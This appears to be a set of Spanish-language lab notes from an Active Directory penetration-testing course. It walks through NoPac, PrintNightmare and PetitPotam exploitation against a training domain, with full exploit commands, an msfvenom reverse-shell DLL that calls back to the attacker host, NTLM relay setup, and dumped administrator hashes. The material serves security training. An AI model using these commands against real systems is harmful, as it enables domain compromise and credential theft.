Muchas organizaciones tardan en aplicar parches, lo que nos permite aprovechar vulnerabilidades recientes para obtener acceso inicial o escalar privilegios. Las técnicas mostradas aquí (actuales en abril de 2022) son ejemplos avanzados pensados para practicar en laboratorio, no para uso directo en entornos reales si no se comprenden bien los riesgos. Aunque son menos destructivas que otras (como Zerologon), siempre hay que actuar con precaución, documentar todo y avisar al cliente. Se recomienda probar estas técnicas y seguir investigando, ya que en ciberseguridad es clave mantenerse actualizado.
### Montando el escenario

En esta sección se realizarán todos los ejemplos desde un host atacante Linux (ATTACK01, accesible por SSH). Para las partes que requieren herramientas de Windows como Rubeus o Mimikatz, puedes usar el host MS01 y aplicar el mismo ataque Pass-the-Ticket con el blob en base64 obtenido con `ntlmrelayx.py` y `petitpotam.py`.

##### NoPac (SamAccountName Spoofing)

**NoPac** es una técnica de escalada de privilegios dentro del dominio que aprovecha las vulnerabilidades **CVE-2021-42278** y **CVE-2021-42287**:

- `42278`: permite suplantar nombres de cuenta de equipo (SAMAccountName).    
- `42287`: afecta al certificado de atributos de privilegio Kerberos (PAC).    

**Funcionamiento:**  
Un usuario autenticado puede crear hasta 10 equipos en el dominio. Cambiando el nombre de uno de ellos para que coincida con el de un DC (`SAMAccountName`), y solicitando tickets Kerberos, el sistema nos otorga privilegios como si fuéramos el controlador de dominio. Esto permite incluso obtener una shell SYSTEM en el DC.

La herramienta para explotarlo se encuentra en `/opt/nopac` del host ATTACK01. Usa Impacket para comunicarse, subir payloads y ejecutar comandos desde el host atacante al DC. Antes de usarlo, asegúrate de tener Impacket instalado y haber clonado el repo del exploit. Una vez que tenemos **Impacket** instalado y el repositorio de **NoPac** clonado, podemos comprobar si el entorno es vulnerable con `scanner.py`, usando una cuenta estándar del dominio. Si se consigue obtener un **TGT**, el sistema es vulnerable. Después, con `noPac.py`, podemos explotar la vulnerabilidad y obtener una shell como **NT AUTHORITY\SYSTEM** en el DC.

Este ataque depende de que el atributo `ms-DS-MachineAccountQuota` esté en su valor por defecto (10). Si un administrador lo ha puesto a 0, no podremos crear cuentas de máquina y el ataque fallará.

```shell
amr251@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

Una forma común de aprovechar **NoPac** es obtener una shell como **NT AUTHORITY\SYSTEM**, suplantando al administrador del dominio. Para ello se ejecuta `noPac.py` indicando el usuario objetivo. Esto nos da acceso seminteractivo en el **Domain Controller**.

Sin embargo, este método puede ser **ruidoso** y detectado o bloqueado por **antivirus o EDR**. 

##### Ejecutand NoPac y obteniendo una shell

```shell-session
amr251@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

...SNIP...

[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

Al ejecutar el exploit con `noPac.py`, se abre una **shell seminteractiva** mediante `smbexec.py`, por lo que es necesario usar rutas completas (no funciona `cd`). Además, el **TGT se guarda** localmente en el directorio desde el que se lanza el ataque. Podemos usar `ls` para verlo y reutilizarlo.

##### Confirmando la localización de los tickets guardados

```shell-session
amr251@htb[/htb]$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

El archivo `.ccache` generado puede usarse para un **Pass-The-Ticket** y realizar ataques como **DCSync**.  
Además, con la opción `-dump`, `noPac.py` permite ejecutar directamente un **DCSync** con `secretsdump.py`.  
Este proceso también genera un archivo `.ccache`, que conviene **eliminar tras el uso** por motivos de OPSEC.

##### Usando NoPac para hacer DCSync sobre la cuenta de administrador

```shell-session
amr251@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

...SNIP...

inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

### Consideraciones sobre Windows Defender y SMBEXEC.py

Si el objetivo tiene **Windows Defender** u otro AV/EDR activo, la shell puede establecerse, pero los comandos probablemente fallarán. Esto se debe a que `smbexec.py` crea servicios temporales (`BTOBTO`, `BTOBO`) y ejecuta comandos mediante scripts `.bat` enviados por SMB. Cada comando genera un nuevo script temporal que se ejecuta y luego se elimina, lo que puede ser detectado como actividad maliciosa por soluciones de seguridad.

Si la **OPSEC** es una prioridad, es mejor **evitar herramientas como `smbexec.py`**, ya que generan mucho ruido. Este módulo se centra en técnicas y tácticas; la metodología se irá puliendo en módulos más avanzados, pero es clave empezar con una buena base en **enumeración y ataque en AD**.

### PrintNightmare

**PrintNightmare** es el nombre de dos vulnerabilidades del servicio **Print Spooler** (CVE-2021-34527 y CVE-2021-1675) que afectan a todos los sistemas Windows. Permiten escalada de privilegios y ejecución remota. Aunque se cubren como LPE en otro módulo, también son útiles en entornos AD para obtener acceso remoto. Aquí se usará el exploit de **cube0x0** para lograr una shell SYSTEM en un DC con Windows Server 2019. El exploit debe clonarse primero con Git en el host atacante.

```shell-session
$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```

Para que este exploit funcione correctamente, tendremos que usar la versión de Impacket de `cube0x0`. Puede que necesitemos desinstalar nuestra versión de Impacket e instalar la mencionada. Podemos usar `rpcdump.py` para comprobar si el objetivo expone los protocolos **Print System Asynchronous** y **Print System Remote**, lo cual indicaría que es vulnerable a PrintNightmare.

##### Enumerando MS-RPRN

```shell-session
$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

Después de confirmar esto, podemos intentar realizar el exploit. Podemos empezar montando un DLL usando `msfvenom`:

```shell
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

Creamos ahora un share SMB con `impacket-smbserver` en nuestra máquina de atacante para subirlo. Como siempre, por un lado montamos el handler para la reverse shell con Metasploit (`exploit/multi/handler`) .

```shell-session
$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Finalmente ejecutamos el exploit:

```shell-session
$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
```

Al final del comando del exploit se especifica la ruta UNC al recurso compartido donde está alojado el payload (`\\<IP_del_atacante>\Share\payload.dll`). Si el ataque tiene éxito, el objetivo accede al recurso compartido, ejecuta la DLL, y esta se conecta de vuelta al _multi-handler_, dándonos una **shell como SYSTEM**.

### PetitPotam (MS-EFSRPC)

**PetitPotam** (CVE-2021-36942) es una vulnerabilidad de _spoofing_ en LSA que permite forzar a un **Controlador de Dominio** a autenticarse contra otro host mediante **NTLM sobre el puerto 445**, abusando del protocolo **MS-EFSRPC**.

Si el entorno usa **AD CS**, el atacante puede redirigir esa autenticación al **servidor de certificados** (CA), solicitar un certificado digital, y usarlo (con herramientas como **Rubeus** o `gettgtpkinit.py`) para obtener un **TGT** válido del DC.

Esto permite ejecutar un **DCSync** y comprometer el dominio.

El ataque comienza lanzando `ntlmrelayx.py`, apuntando a la Web de inscripción de certificados del CA y usando una plantilla válida. Si no se conoce la URL del CA, se puede descubrir con herramientas como **certi**.

##### Comenzando `ntlmrelayx.py`

```shell
$ sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

...SNIP...

[*] Servers started, waiting for connections
```

En otra ventana, lanzamos `PetitPotam.py` con el siguiente comando:

```bash
python3 PetitPotam.py <IP atacante> <IP del DC>
```

Esto fuerza al **DC a autenticarse** contra nuestro equipo, donde `ntlmrelayx.py` está esperando. También existen versiones para Windows:

- En **Mimikatz**:  
    `misc::efs /server:<DC> /connect:<ATACANTE>`
- En **PowerShell**:  
    `Invoke-PetitPotam.ps1`

Todas usan el método **EfsRpcOpenFileRaw** para desencadenar la autenticación NTLM.

##### Atrapando el certificado en Base64 para DC01 

De vuelta a la pantalla donde teníamos NLTM Relay, veremos una solicitud de login exitosa para obtener el certificado en Base64 para el DC si el ataque ha tenido éxito:

```shell-session
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIIStQIBAzCCEn8GCSqGSIb...
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
```

##### Solicitando un TGT usando `gettgtpkinit.py`

Ahora, podemos coger este certificado en Base64 y usar `gettgtpkinit.py` para solicitar un TGT (_Ticket-Granting-Ticket_) para el DC. 

```shell-session
amr251@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

El TGT solicitado anteriormente se guardó en el archivo `dc01.ccache`, el cual usamos para establecer la variable de entorno `KRB5CCNAME`, de forma que nuestro host de ataque utilice este archivo para los intentos de autenticación Kerberos.

```shell-session
$ export KRB5CCNAME=dc01.ccache
```

##### Usando el TGT del DC para acontecer DCSync

